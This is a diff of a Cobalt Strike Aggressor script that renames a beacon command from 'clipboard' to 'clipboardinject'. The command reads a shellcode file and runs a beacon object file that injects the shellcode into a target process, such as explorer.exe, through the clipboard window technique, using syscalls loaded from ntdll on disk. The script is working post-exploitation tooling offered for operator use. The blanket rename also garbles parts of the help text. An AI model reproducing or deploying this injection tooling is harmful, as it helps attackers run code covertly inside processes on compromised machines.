@@ -523,7 +523,7 @@ Usage:   uxsubclassinfo <SHELLCODE>
 );
 
 
-alias clipboard
+alias clipboardinject
 {
     local('$bid $pid $shellcode $shellfile $fp $args');
 
@@ -533,7 +533,7 @@ alias clipboard
     if(2 > size(@_) || 3 < size(@_) )
     {
         berror($bid, "Invalid number of arguments");
-        berror($bid, beacon_command_detail("clipboard"));
+        berror($bid, beacon_command_detail("clipboardinject"));
         return;
     }
 
@@ -542,7 +542,7 @@ alias clipboard
     if($pid < 0 || $pid > 65535)
     {
         berror($bid, "Invalid PID");
-        berror($bid, beacon_command_detail("clipboard"));
+        berror($bid, beacon_command_detail("clipboardinject"));
         return;
     }
 
@@ -562,7 +562,7 @@ alias clipboard
     if (!-canread $shellfile)
     {
         berror($bid, "Invalid SHELLCODE " . $shellfile . " - Cannot read file");
-        berror($bid, beacon_command_detail("clipboard"));
+        berror($bid, beacon_command_detail("clipboardinject"));
         return;
     }
     $fp = openf($shellfile);
@@ -573,21 +573,21 @@ alias clipboard
     $args = bof_pack($bid, "ib", $pid, $shellcode);
 
     # Execute BOF
-    beacon_inline_execute($bid, readbof($bid, "clipboard"), "go", $args);
+    beacon_inline_execute($bid, readbof($bid, "clipboardinject"), "go", $args);
 }
 
 beacon_command_register(
-    "clipboard",
-    "clipboard injection technique",
+    "clipboardinject",
+    "clipboardinject injection technique",
     "
-Command: clipboard 
-Summary: This command injects shellcode into a process using the clipboard 
+Command: clipboardinject 
+Summary: This command injects shellcode into a process using the clipboardinject 
          technique in combination with loading our own version of the syscall 
          commands from ntdll on disk. This can only target processes with 
-         windows that have a clipboard window, e.g., explorer.exe, 
+         windows that have a clipboardinject window, e.g., explorer.exe, 
          vmtoolsd.exe, or the svchost.exe on Windows 10 responsible for the
-         clipboard service.
-Usage:   clipboard <PID> <SHELLCODE>
+         clipboardinject service.
+Usage:   clipboardinject <PID> <SHELLCODE>
          PID        Required. The PID to inject into. Enter '0' as the PID to 
                     have COBALTSTRIKE uses the spawnto to create a temporary 
                     process to inject into, but this will not work with the
